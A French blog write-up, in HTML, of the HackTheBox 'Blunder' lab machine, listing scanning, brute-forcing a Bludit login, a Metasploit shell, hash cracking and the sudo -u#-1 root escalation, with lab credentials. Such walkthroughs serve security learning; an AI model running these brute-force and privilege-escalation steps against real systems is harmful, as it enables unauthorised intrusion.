@@ -1,0 +1,1566 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "\/"
+        },
+        "articleSection" : "blog-fr",
+        "name" : "Blunder",
+        "headline" : "Blunder",
+        "description" : "HackTheBox - Blunder",
+        "inLanguage" : "en",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-07-30 00:00:00 \x2b0000 UTC",
+        "dateModified" : "2020-07-30 00:00:00 \x2b0000 UTC",
+        "url" : "\/blog-fr\/hackthebox\/blunder\/",
+        "wordCount" : "832",
+        "keywords" : [ "Blog" ]
+    }
+    </script>
+        
+            
+                <title>Blunder</title>
+            
+        
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="generator" content="Hugo 0.68.3" />
+        
+
+
+        
+            <meta name="author" content="AlrikRr">
+        
+        
+            <meta name="description" content="HackTheBox - Blunder">
+        
+
+        <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Blunder"/>
+<meta name="twitter:description" content="HackTheBox - Blunder"/>
+<meta name="twitter:site" content="@AlrikRr"/>
+
+        <meta property="og:title" content="Blunder" />
+<meta property="og:description" content="HackTheBox - Blunder" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog-fr/hackthebox/blunder/" />
+<meta property="article:published_time" content="2020-07-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-07-30T00:00:00+00:00" />
+
+        <meta property="og:image" content="//images/logo.png">
+        <meta property="og:image:type" content="image/png">
+        <meta property="og:image:width" content="512">
+        <meta property="og:image:height" content="512">
+        <meta itemprop="name" content="Blunder">
+<meta itemprop="description" content="HackTheBox - Blunder">
+<meta itemprop="datePublished" content="2020-07-30T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-07-30T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="832">
+
+
+
+<meta itemprop="keywords" content="" />
+        
+
+        
+            
+        
+
+        
+        
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,800,900|Source+Sans+Pro:400,700">
+            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css">
+            <link rel="stylesheet" href="/css/main.css">
+            <link rel="stylesheet" href="/css/add-on.css">
+            <link rel="stylesheet" href="/css/academicons.min.css">
+	    <link disabled id="dark-mode-theme" rel="stylesheet" href="/css/dark.css">
+        
+
+        
+            
+                
+            
+        
+
+
+  
+    
+    <link href='//cdn.bootcss.com/highlight.js/9.11.0/styles/github.min.css' rel='stylesheet' type='text/css' />
+  
+
+
+      
+    </head>
+    <body>
+
+      
+      <div id="wrapper">
+
+    
+    
+<header id="header">
+    
+      <h1><a href="/">blog-fr</a></h1>
+    
+
+    <nav class="links">
+        <ul>
+            
+                <li>
+                    <a href="/blog-fr/">
+                            <i class="">&nbsp;</i>🇫🇷 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/blog-en/">
+                            <i class="">&nbsp;</i>🇬🇧 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/projects/">
+                            <i class="fa fa-list">&nbsp;</i>Projects
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories/">
+                            <i class="fa fa-folder">&nbsp;</i>Categories
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about/">
+                            <i class="">&nbsp;</i>👺 My resume
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://www.levulgarisateurnumerique.com/">
+                            <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://secforall.org/">
+                            <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                    </a>
+                </li>
+            
+        </ul>
+    </nav>
+    <nav class="main">
+        <ul>
+            
+            <li id="share-nav" class="share-menu" style="display:none;">
+                <a class="fa-share-alt" href="#share-menu">Share</a>
+            </li>
+            
+            <li>
+	 <a id="dark-mode-toggle" class="fal fa-moon-o">Dark Mode</a>
+            </li>
+            <li class="menu">
+                <a class="fa-bars" href="#menu">Menu</a>
+            </li>
+        </ul>
+    </nav>
+
+	<script>
+var toggle = document.getElementById("dark-mode-toggle");
+var darkTheme = document.getElementById("dark-mode-theme");
+var savedTheme = localStorage.getItem("dark-mode-storage") || "light";
+setTheme(savedTheme);
+
+toggle.addEventListener("click", () => {
+    if (toggle.className === "fal fa-moon-o") {
+        setTheme("dark");
+    } else if (toggle.className === "fal fa-sun-o") {
+        setTheme("light");
+    }
+});
+
+function setTheme(mode) {
+	    localStorage.setItem("dark-mode-storage", mode);
+    if (mode === "dark") {
+        darkTheme.disabled = false;
+        toggle.className = "fal fa-sun-o";
+    } else if (mode === "light") {
+        darkTheme.disabled = true;
+        toggle.className = "fal fa-moon-o";
+    }
+}
+	</script>
+
+</header>
+
+
+<section id="menu">
+
+    
+        <section>
+            <form class="search" method="get" action="//google.com/search">
+                <input type="text" name="q" placeholder="Search" />
+                <input type="hidden" name="as_sitesearch" value="/">
+            </form>
+        </section>
+
+    
+        <section>
+            <ul class="links">
+                
+                    <li>
+                        <a href="/blog-fr/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇫🇷 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/blog-en/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇬🇧 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/projects/">
+                            <h3>
+                                <i class="fa fa-list">&nbsp;</i>Projects
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories/">
+                            <h3>
+                                <i class="fa fa-folder">&nbsp;</i>Categories
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/about/">
+                            <h3>
+                                <i class="">&nbsp;</i>👺 My resume
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://www.levulgarisateurnumerique.com/">
+                            <h3>
+                                <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://secforall.org/">
+                            <h3>
+                                <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+            </ul>
+        </section>
+
+    
+        <section class="recent-posts">
+            <div class="mini-posts">
+                <header>
+                    <h3>Recent Posts</h3>
+                </header>
+                
+
+                
+                    
+                
+
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-18'>
+                                    November 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-11'>
+                                    November 11, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-18'>
+                                    September 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-15'>
+                                    September 15, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-14'>
+                                    September 14, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-12'>
+                                    September 12, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+
+                
+                    <a href=
+                        
+                            /blog/
+                        
+                        class="button">View more posts</a>
+                
+            </div>
+        </section>
+
+    
+        
+</section>
+
+    <section id="share-menu">
+    <section id="social-share-nav">
+        <ul class="links">
+            <header>
+                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
+            </header>
+            
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fhackthebox%2fblunder%2f&amp;text=Blunder&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fhackthebox%2fblunder%2f&amp;title=Blunder" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fhackthebox%2fblunder%2f&amp;title=Blunder" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+        </ul>
+    </section>
+</section>
+
+    
+    <div id="main">
+        
+        
+        <article class="post">
+  <header>
+    <div class="title">
+        
+            <h1><a href="/blog-fr/hackthebox/blunder/">Blunder</a></h1>
+            
+        
+        
+            <p>HackTheBox - Blunder</p>
+        
+    </div>
+    <div class="meta">
+        
+
+        <time class="published"
+            datetime='2020-07-30'>
+            July 30, 2020</time>
+        <span class="author">AlrikRr</span>
+        
+            <p>4 minute read</p>
+        
+        
+    </div>
+</header>
+
+
+  
+    <section id="social-share">
+      <ul class="icons">
+        
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fhackthebox%2fblunder%2f&amp;text=Blunder&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fhackthebox%2fblunder%2f&amp;title=Blunder" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fhackthebox%2fblunder%2f&amp;title=Blunder" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    </section>
+  
+
+  
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/hackthebox/blunder/" class="image featured">
+            <img src="/img//writeup/blunder/htb-blunder.png" alt="">
+        </a>
+    
+
+
+  <div id="content">
+    <p><img src="/img/writeup/blunder/blunder.png" alt="blunder"></p>
+<p>Hello, aujourd&rsquo;hui je vais vous présenter un Write-up de la Machine Blunder sur HackTheBox !</p>
+<p>C&rsquo;est une Machine EASY sous Linux :)</p>
+<p>Il s&rsquo;agit d&rsquo;un Write-Up avec ma méthodologie, je ne suis en aucun cas un expert, je suis ici pour apprendre !</p>
+<hr>
+<h1 id="tools">Tools</h1>
+<ul>
+<li>Kali linux 2020 + Tous les tools</li>
+<li>zsh pour le shell</li>
+<li>VirtualBox pour la VM sous Kali</li>
+</ul>
+<hr>
+<h2 id="nmap">NMAP</h2>
+<p>Premièrement, un petit NMAP pour avoir un aperçu sur les PORTS et si possible des numéros de version.<br>
+<code>sudo nmap -v -sS -A -T5 10.10.10.191</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: A0F0E5D852F0E3783AF700B6EE9D00DA
+|_http-generator: Blunder
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+</code></pre><p>On peut voir un port FTP, intéressant, on va regarder s&rsquo;il est possible de s&rsquo;y connecter en <strong>ANONYMOUS</strong>.</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">ヤマト» ftp 10.10.10.191            
+ftp: connect: Connection refused
+ftp&gt; 
+</code></pre><p>Bon apparemment non.<br>
+ALlons regarder le site web de plus près.</p>
+<h2 id="site-web">Site Web</h2>
+<p>A première vue, il n&rsquo;y a rien de très intéressant, je vais utiliser <code>dirb</code> pour trouver des pages &ldquo;cachées&rdquo;.<br>
+J&rsquo;utilise la wordlist <code>medium.txt</code>.</p>
+<p><img src="/img/writeup/blunder/dirb.png" alt="dirb"></p>
+<p>A première vu ca ressamble à un CMS, on va regarder les CVE du CMS mais avant ça il me faut le nom du CMS.</p>
+<p><code>http://10.10.10.191/admin/ </code></p>
+<p><strong>BLUDIT</strong></p>
+<p>Après quelques recherches de CVE je suis tombé sur ce github : <a href="https://github.com/pingport80/CVE-2019-17240">pingport80/CVE-2019-17240</a></p>
+<p>On va déjà tester un BRUTEFORCE sur le compte admin, en sachant que je ne suis pas sur que le compte admin existe, en regardant la doc BLUDIT c&rsquo;est un compte par défaut.</p>
+<p><code>python3 brute.py -u http://10.10.10.191 -user admin -w /usr/share/wordlists/rockyou.txt</code></p>
+<p><img src="/img/writeup/blunder/brute_1.png" alt="brute_1"></p>
+<p>Après quelques minutes j&rsquo;ai arrété le BRUTEFORCE, ca ne sert à rien de percister sur HackTheBox avec ce genre de technique.</p>
+<p>Il s&rsquo;agit de BLUDIT 3.9.2, on peut regarder les exploit avec <code>searchsploit</code>.</p>
+<p><img src="/img/writeup/blunder/searchsploit.png" alt="searchploit"></p>
+<h2 id="petite-pause">Petite Pause</h2>
+<p>Bon reprenons, je suis sur qu&rsquo;il nous faut utiliser un exploit CVE mais pour ça il nous faut d&rsquo;abord un LOGIN et un MOT DE PASSE pour l&rsquo;utiliser.</p>
+<p>Je suis allé faire un tour sur le forum HackTheBo pour avoir quelques HINTS.</p>
+<p>Il y aurait un fichier texte important à trouver.</p>
+<p>Pour ça, j&rsquo;utilise <code>WFUZZ</code>.</p>
+<p>Je prends direct la wordlist <strong>BIG</strong>.</p>
+<p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hc 404,403 -u &quot;http://10.10.10.191/FUZZ.txt&quot; -t 100 </code></p>
+<p><img src="/img/writeup/blunder/wfuzz.png" alt="wfuzz"></p>
+<p>BINGO il y a une fichier <code>todo.txt</code> !</p>
+<pre><code>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre><p>fergus ? Peut-être un nom d&rsquo;utilisateur ?</p>
+<p>Je recommence avec l&rsquo;outil <strong>BRUTE</strong> de tout à l&rsquo;heure.</p>
+<p>Non toujours rien.</p>
+<p>Je suis tombé sur un exploit de BLUDIT : <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">bludit-brute-force-mitigation-bypass/</a></p>
+<p>Mais il nous manque toujours le mot de passe.</p>
+<h2 id="wordlist">Wordlist</h2>
+<p>Après avoir essayé toutes les wordlists possible, je suis tombé sur l&rsquo;outil <code>cewl</code> qui permet de générer une wordlist personnalisé.</p>
+<p><code>$ cewl -w dl_wordlists.txt -d 10 -m 1 http://10.10.10.191/</code></p>
+<p><strong>Pas moyn de faire fonctionne le script du lien précédent, je reprends BRUTE</strong></p>
+<p><code>python3 brute.py -u http://10.10.10.191/ -user fergus -w ~/Documents/HTB/blunder/dl_wordlist.txt</code></p>
+<p>TROUVE !</p>
+<p><code>fergus : RolandDeschain  ==&gt;found</code></p>
+<h2 id="msf">MSF</h2>
+<p>Maintenant que j&rsquo;ai un login et un mot de passe, je peux tester l&rsquo;exploit de la CVE avec msfconsole.</p>
+<p><img src="/img/writeup/blunder/msf.png" alt="msf"></p>
+<p>J&rsquo;ai du m&rsquo;y reprendre à deux fois car j&rsquo;avais oublié de set le PAyload avec mon IP VPN.</p>
+<p>Cet exploit me permet d&rsquo;avoir un shell sur la machine. ENFIN !</p>
+<h2 id="shell">Shell</h2>
+<p>En fouillant <code>/var/www/bludit-3.9.2/bl-content/databases</code> on se retrouve avec pleins de fichiers php.</p>
+<p>Le plus intéressant est le fichier <code>users.php</code> qui contient un hash et un salt d&rsquo;un compte <strong>admin</strong>.</p>
+<p>On identifie le Hash avec l&rsquo;outils <code>hash-identifier</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">ヤマト» hash-identifier 
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+---------------------------------------------------
+ HASH: bfcc887f62e36ea019e3295aafb8a3885966e265
+
+Possible Hashs:
+[+] SHA-1
+[+] MySQL5 - SHA-1(SHA-1($pass))
+
+</code></pre><p>Pour trouvé le mot de passe j&rsquo;ai utilisé le site : <a href="https://md5hashing.net/">md5hashing.net</a></p>
+<p>le mot de passe est : <code>Password120</code></p>
+<h2 id="user">USER</h2>
+<p>Dans le home de la machine on peut voir 2 users : <code>hugo</code> et <code>shaun</code></p>
+<p>Essayons le mot de passe pour le compte hugo ?</p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">su hugo
+Password: Password120
+id
+uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
+</code></pre><p>BOUM un accès USER avec un flag !</p>
+<p>On fait spawn un bash plus sympa avec : <code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)' </code></p>
+<h2 id="root">ROOT</h2>
+<p>EN faisaint un <code>sudo -l</code> on peut voir <code> (ALL, !root) /bin/bash</code> ce qui est très étrange.</p>
+<p>Après une petite recherche sur exploit-db je suis tombé sur cet exploit</p>
+<p><a href="https://www.exploit-db.com/exploits/47502">exploits/47502</a></p>
+<p>Du coup il suffit de taper cette commande :
+<code>sudo -u#-1 /bin/bash</code></p>
+<p>Nous voila root !</p>
+
+  </div>
+
+  <footer>
+    <ul class="stats">
+  <li class="categories">
+    <ul>
+        
+            
+            
+                <i class="fa fa-folder"></i>
+                
+                
+                <li><a class="article-category-link" href="/categories/hackthebox">HackTheBox</a></li>
+                
+            
+        
+    </ul>
+  </li>
+  <li class="tags">
+    <ul>
+        
+    </ul>
+  </li>
+</ul>
+
+  </footer>
+
+</article>
+
+
+<ul class="actions pagination">
+    
+        <li><a href="/blog-fr/hackthebox/traceback/"
+                class="button big previous">Traceback</a></li>
+    
+
+    
+        <li><a href="/blog-fr/hackthebox/admirer/"
+                class="button big next">Admirer</a></li>
+    
+</ul>
+
+
+    </div>
+    
+<section id="sidebar">
+
+  
+  <section id="intro">
+    
+    
+      
+        <a href='/'><img src="/img/main/logo.jpg" class="intro-circle" width="250" alt="AlrikRr" /></a>
+      
+    
+    
+      <header>
+        <h2>Hello, friend.</h2>
+        <p>The greatest enemy of knowledge is not ignorance, it is the illusion of knowledge.</p>
+      </header>
+    
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+  </section>
+
+  
+  <section class="recent-posts">
+    <div class="mini-posts">
+      <header>
+        <h3>Recent Posts</h3>
+      </header>
+      <div class="posts-container">
+        
+
+        
+          
+        
+
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-18'>
+                November 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-11'>
+                November 11, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-18'>
+                September 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-15'>
+                September 15, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-14'>
+                September 14, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-12'>
+                September 12, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+      </div>
+
+      
+        <a href=
+          
+            /blog/
+          
+        class="button">View more posts</a>
+      
+    </div>
+  </section>
+
+  
+  
+  
+  
+  
+    <section id="categories">
+      <header>
+        <h3>
+          <a href="/categories/">Categories</a>
+        </h3>
+      </header>
+        
+          
+        
+
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hackthebox/">hackthebox</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/tuto/">tuto</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/projects/">projects</a>
+                <span style="float:right;">5</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/en-nixos/">en-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/fr-nixos/">fr-nixos</a>
+                <span style="float:right;">4</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/exploitation-binaire/">exploitation-binaire</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/iot/">iot</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/machine-learning/">machine-learning</a>
+                <span style="float:right;">3</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/archlinux/">archlinux</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hacking/">hacking</a>
+                <span style="float:right;">2</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/android/">android</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/project/">project</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/raspberry/">raspberry</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/s%C3%A9curit%C3%A9/">sécurité</a>
+                <span style="float:right;">1</span>
+              
+            </header>
+          </article>
+        </p>
+        
+    </section>
+  
+  
+
+  
+  
+
+  
+  <section id="footer">
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
